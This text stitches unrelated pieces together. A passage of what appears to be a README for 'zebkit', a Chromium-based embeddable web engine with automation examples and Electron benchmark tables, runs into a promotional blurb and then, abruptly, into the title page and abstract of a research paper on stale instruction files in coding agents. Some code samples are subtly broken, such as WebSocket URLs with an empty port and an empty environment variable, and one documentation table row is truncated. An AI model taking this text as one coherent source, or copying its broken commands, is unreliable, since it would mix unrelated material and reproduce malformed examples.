${tasks().length} done`), h(For, {each: tasks}, Task))); ``` ![examples/ui/todo.mjs](docs/images/zebkit-ui-todo.png) ### Agents Playwright's API runs inside the engine (`docs/AUTOMATION.md`): every command of Playwright's protocol, in the application's process, with no CDP and no Node.js. From C it is one call, `zebkit_automation_call(view, "Frame.click", "{\"selector\": \"#go\"}", done, data)`; Python has it with Playwright's names: ```python import zebkit from zebkit.automation import Page, expect, run async def test(): page = Page() await page.goto("https://example.com/") await expect(page).to_have_title("Example Domain") await expect(page.get_by_text("documentation examples")).to_be_visible() await page.screenshot(path="example.png") zebkit.quit() zebkit.main(lambda: run(test()), ["python", "--headless"]) ``` Playwright's own clients, its test runner and its other languages included, connect to the engine's Playwright endpoint unchanged: ```sh tools/zebkit-run --headless --playwright-port=0 # prints "Playwright listening on ws://127.0.0.1:/" ``` ```js const browser = await chromium.connect('ws://127.0.0.1:/'); const page = await (await browser.newContext()).newPage(); ``` Agents and tools that speak CDP drive zebkit as they would drive Chrome: ```sh tools/zebkit-run --headless --remote-debugging-port=9222 https://example.com/ ``` Any CDP client connects to `http://127.0.0.1:9222`. An MCP client gets the engine's capabilities as tools from `tools/zebkit-mcp`, a separate program, with file access and origins denied until its operator grants them ([docs/MCP.md](docs/MCP.md)): ```sh ZEBKIT_DIR= cargo build --release --manifest-path tools/zebkit-mcp/Cargo.toml # or the archive's zebkit-mcp --allow-origin https://example.com --allow-write ~/agent-files # on standard input and output zebkit-mcp --http 8931 --allow-origin '*' # on 127.0.0.1, with a token ``` ### The examples ```sh mise example:linux:basic # examples/window.c: a browser window mise example:rust:window # the same in Rust mise example:ffmpeg # examples/ffmpeg.cpp: a library inside the engine (cd examples/gpui-browser && cargo run --release) # a tabbed browser in GPUI-KIT ``` ## Benchmark Against the latest stable Electron, 45.2.1 (Chromium 156), measured the same way: one harness, the same pages, two thin hosts that do the same thing, every process counted, medians of 5 to 11 runs taking turns, Linux x86-64, 2026-11-06 and 07 (`scripts/electron-compare.sh`, `docs/reports/electron-compare.md`). | | zebkit 0.2.0 | Electron 45.2.1 | | |---|---:|---:|---| | As an application ships it, uncompressed / `.tar.xz` | **171.2 / 59.4 MiB** | 260.5 / 87.1 MiB | 34% smaller | | Start, cold, to first paint | **2.3 s** | 6.6 s | 66% less | | Start, warm, to first paint | **116 ms** | 236 ms | 51% less | | Memory, a blank page | **179 MB** | 250 MB | 29% less | | A call from the page to the host and back, 1 MiB / 16 MiB | **3.3 / 58 ms** | 4.3 / 66 ms | 23% / 12% less | | DOM, 20,000 elements made and laid out | 280 ms | 278 ms | level | | JavaScript and DOM, ten workloads | 1139 ms | 1193 ms | level | | Text layout, a chapter of a book | 8.1 ms | 7.6 ms | level, within noise | | A 756-page PDF in each one's viewer: CPU / memory | **0.75 s / 261 MB** | 1.6 s / 399 MB | 53% / 35% less | | Ten popular sites: CPU loading / memory | **21.7 s / 4756 MB** | 25.2 s / 5060 MB | 14% / 6% less | | Processes, a page | 7 | **6** | one more: storage sandboxed in its own, as Chrome | - **Size.** zebkit keeps the whole web platform applications use: HTML, CSS, JavaScript with every JIT tier, WebAssembly, WebGL, media with H.264 and AAC, HTTP/3, PDF. - **Speed.** Chrome's own profile-guided optimization reaches Blink because zebkit is built with CFI as Chrome is; every speed change is kept only when it gains more than it costs in size (`docs/SIZE_AND_SPEED.md`). - **Where Electron is ahead**: one process fewer a page, and memory on two of the ten sites, YouTube and The Verge, where advertising and video decide. - How each number is made: `docs/SIZE_AND_SPEED.md`. The same Playwright commands three ways, headless, medians (`docs/reports/automation-bench.md`, `scripts/automation-bench.sh`): | | zebkit's API, in-process | Your Playwright scripts, connected to zebkit | Playwright with Chrome 156 | |---|---:|---:|---:| | `locator.click()` | **2.0 ms** | 3.5 ms | 33.3 ms | | `locator.fill()` | 2.1 ms | **2.0 ms** | 2.9 ms | | `locator.press('Enter')` | **0.59 ms** | 0.98 ms | 2.6 ms | | `locator.textContent()` | **0.23 ms** | 0.70 ms | 0.81 ms | | `allTextContents()` of 200 | **0.34 ms** | 1.9 ms | 1.9 ms | | `page.goto()` | **11.2 ms** | 13.0 ms | 18.2 ms | | `page.screenshot()` | **12.4 ms** | 16.7 ms | 33.8 ms | | `page.screenshot({type: 'jpeg'})` | **13.9 ms** | 14.4 ms | 32.9 ms | | the screenshot's pixels, unencoded | **9.3 ms** | | | - **zebkit's API, in-process**: your program calls the command through ``, Python's `zebkit.automation` or Rust's `zebkit::automation`; it runs inside the engine, with no Node.js and no protocol. - **Your Playwright scripts, connected to zebkit**: Playwright's own Node.js client, unchanged, with `chromium.connect()` to zebkit's endpoint; its test suite (v1.64.1) passes 4,046 of its tests there, Chrome 4,196 (`docs/AUTOMATION.md`, section 7). - **Playwright with Chrome**: Playwright as usual, over CDP. - **Why it is faster**: one call in the renderer where Playwright's server makes several round trips over CDP, no JSON between processes, no Node.js process (Playwright's alone reached 175 MiB); and the frames a click's checks wait for are made at once instead of at 60 Hz on a page without a display. - **A screenshot is 2.7 times faster**: the fresh frame it takes is made at once instead of at the next 60 Hz tick, the PNG is deflated at level 1 with the Up filter (2 ms where Chrome's default level takes 13, for 59 KB instead of 40 KB on this page), and the picture's shared memory is made in one call instead of a page fault at a time. What is left of the 12 ms is the page's frame (4 ms), copying the picture out of the compositor (4 ms) and encoding it (4 ms). The pixels themselves, with no encoding (`zebkit_automation_screenshot_pixels()`, zebkit's own), take 9 ms. Over CDP zebkit does what Chrome does: frames at 60 Hz, Chrome's PNG. ## Reference ### Documentation | Document | What it covers | |---|---| | [docs/API.md](docs/API.md) | Everything an application can call, in C, Rust, Python and JavaScript | | [docs/BUILD.md](docs/BUILD.md) | Fetching Chromium, building, packaging, testing, measuring and releasing; profiles and patches | | works, what zebkit does instead, the endpoint, what it costs | | [docs/MCP.md](docs/MCP.md) | `tools/zebkit-mcp`: the engine as MCP tools for agents, its bounds, what is weak | | [docs/SIZE_AND_SPEED.md](docs/SIZE_AND_SPEED.md) | Where the size goes, what was cut and kept, the compiler against speed, the Electron baseline | | [docs/MACOS.md](docs/MACOS.md) | The macOS framework, native and cross builds | | [docs/WINDOWS.md](docs/WINDOWS.md) | The Windows DLL, its sandbox, cross-building on Linux, the state of the port | | [docs/SANDBOX.md](docs/SANDBOX.md) | The sandbox on each system, and running without one | | [docs/LICENSING.md](docs/LICENSING.md) | zebkit's license, the third-party licenses inside the engine, and what shipping it involves | | [docs/ROADMAP.md](docs/ROADMAP.md) | The library and the engine: requirements, what is done, what is next | | [docs/ROADMAP_HOOKS.md](docs/ROADMAP_HOOKS.md) | Hooks: how an application decides what the engine does, from native code | | [docs/UI.md](docs/UI.md) | `zebkit.ui`: the engine's own small UI, what it is for and what it is not | | [bindings/rust/README.md](bindings/rust/README.md) | The Rust crates | | [bindings/golang/README.md](bindings/golang/README.md) | The Go binding: what it covers, building with cgo | | `docs/releases/` | Each release: what is in it, what was tested, what is missing | | `docs/reports/` | Size reports, regenerated by the scripts | ### Repository | Path | What it holds | |---|---| | `upstream.lock` | The Chromium release built, the pinned depot_tools, the Electron release measured against | | `profiles/` | Build flavours as GN arguments: `slim.gn` (the product), `slim-macos.gn`, `slim-windows.gn`, `baseline.gn` (Chromium's defaults) | | `patches/` | Changes to Chromium, applied in the order of `patches/series` | | `src/engine/` | zebkit's own code, linked into Chromium as `//zebkit/engine`: the library, its C API and headers | | `src/ffmpeg/` | zebkit's FFmpeg configuration, from `scripts/ffmpeg-config.sh` | | `bindings/rust/`, `bindings/python/`, `bindings/golang/` | The Rust crates, the Python binding and the Go binding | | `tools/` | `zebkit-run` (open pages, serve CDP or Playwright's endpoint), `zebkit-js` (applications in JavaScript) and `zebkit-mcp` (the engine as MCP tools) | | `tests/` | Programs that test every layer of the API against a package; speed workloads | | `examples/` | A browser window in C, `zebkit.ui`, a library inside the engine, the Electron baseline | | `scripts/` | Every step, one script each; `mise tasks` lists the short forms | `upstream/` (Chromium's tree, about 30 GB), `out/`, `dist/` and `.cache/` are generated and not tracked. zebkit is Chromium plus a small patch set (`patches/`), built from source. Where Chromium lacks something an application needs, zebkit patches Chromium rather than working around it (`docs/BUILD.md`). ## License zebkit is free software under the GNU Lesser General Public License, version 2.1 or (at your option) any later version: [LICENSE](LICENSE).  Electron makes your app live inside its runtime. Its windows, its Node, its packaging. I wanted the opposite: Chromium as a library, the way you'd add SQLite. zebkit is Blink, V8, PDFium and FFmpeg in one library you link into your own program, in C, Rust, Python or JavaScript. Your app keeps its own event loop, windows and toolkit. Where it needs the web it adds a view. It can be a window, a child of your own window (X11, NSView, HWND), or off-screen with the frames handed to you. Against the latest Electron (45.2.1), on Linux:
- 34% smaller (62 MB compressed)
- cold start in 2.3 s instead of 6.6
- pages in 29% less memory
- same DOM, text-layout and JavaScript speed No Node: your app is native code, or JavaScript run on the engine's own V8. Everything the engine would show the user or ask of the system is your app's to decide:
- permissions, popups, downloads and certificates
- network requests, at every stage
- the window frame, so the page can be your title bar
- menus, dialogs, notifications and tray icons
- USB, HID and serial device pickers
- screen capture Without your code, a page gets nothing a cautious browser wouldn't give it. For automation and AI agents, it speaks CDP as Chromium's own DevTools server, so Puppeteer, Playwright and any CDP client connect unchanged. It also runs Playwright's API natively inside the engine, with no CDP, no Node and no JSON between processes.  Title: When Instruction Files Go Stale: Documentation Debt and Hidden Cost in Coding Agents 
 Authors: Tural Mehtiyev , Biruk Tadesse , Lawrence Arkoh , Wesley Assunção View a PDF of the paper titled When Instruction Files Go Stale: Documentation Debt and Hidden Cost in Coding Agents, by Tural Mehtiyev and 3 other authors 
 View PDF 
 HTML (experimental) 



 
 Abstract: LLM-based coding agents such as Claude Code are guided by repository instruction files (also called context files or agent configuration files) like this http URL and this http URL , which are read in every agent session. As any documentation artifact, these files can fall behind the code and become stale (e.g., a test folder moves, but the file still points to the old one). In technical debt terms, such a stale instruction is documentation debt, and its interest is the cost it adds to every later agent session. Evaluations that check only task success can miss this cost, and the stale file can persist. In this study, we ask what leads agents to act on a stale instruction, how it affects their behavior and at what cost, and how they recover. We study three real-world stale instructions from active open-source repositories in depth, each a different kind of guidance: a test command, a code location, and a procedure for adding a component. Agents fix 22 maintenance tasks under three versions of each instruction (left stale, corrected to the current path, and removed), with the code and the task held fixed, and we analyze 732 trajectories of two models at the level of individual tool calls. We find that agents follow stale guidance when it is relevant to their tasks, sometimes even when correct information is available elsewhere. On the stale test command, Claude Sonnet 5.5 needed about two extra tool calls per run, a third more than with the corrected command; in the other cases, we could not detect a difference. Although agents generally recovered from the immediate failures, none repaired the underlying instruction file. Correcting the instructions eliminated operations on obsolete paths, while removing them prevented most. Our findings show that task success alone can hide the costs of documentation debt, highlighting the need to evaluate agent behavior beyond final outcomes.

 When Instruction Files Go Stale: Documentation Debt and Hidden Cost in Coding Agents Thanks:  Preprint. 
 
 
 Tural Mehtiyev, Biruk Tadesse, Lawrence Arkoh, Wesley Assunção
 
 Affiliation:  North Carolina State University
 {tmehtiy, batadess, larkoh, wguezas}@ncsu.edu
 

 Abstract 
 
 LLM-based coding agents such as Claude Code are guided by repository instruction files (also called context files or agent configuration files) like AGENTS.md and CLAUDE.md, which are read in every agent session. As any documentation artifact, these files can fall behind the code and become stale (e.g., a test folder moves, but the file still points to the old one). In technical debt terms, such a stale instruction is documentation debt, and its interest is the cost it adds to every later agent session (e.g., additional tool calls to correct stale instruction). Evaluations that check only task success can miss this cost and the stale file can persist in the repository. In this study, we ask what leads agents to act on a stale instruction, how it affects their behavior and at what cost, and how they recover. We study three real-world stale instructions from active open-source repositories in depth, each a different kind of guidance: a test command, a code location, and a procedure for adding a component. Agents fix 22 maintenance tasks under three versions of each instruction (left stale, corrected to the current path, and removed), with the code and the task held fixed, and we analyze 732 trajectories of two models at the level of individual tool calls. We find that agents follow stale guidance when it is relevant to their tasks, sometimes even when correct information is available elsewhere. Following stale instructions can lead to wasted tool calls and increased effort without affecting task success. On the stale test command, Claude Sonnet 5.5 needed about two extra tool calls per run, a third more than with the corrected command; in the other cases, we could not detect a difference. Although agents generally recovered from the immediate failures, none repaired the underlying instruction file. Correcting the instructions eliminated operations on obsolete paths, while removing them prevented most. Our findings show that task success alone can hide the costs of documentation debt, highlighting the need to evaluate agent behavior beyond final outcomes. 
 
 
 
 Index Terms:  documentation debt, technical debt, coding agents, LLM agents, repository instructions, AGENTS.md, CLAUDE.md, context files, stale documentation, agent trajectories, software maintenance, controlled evaluation
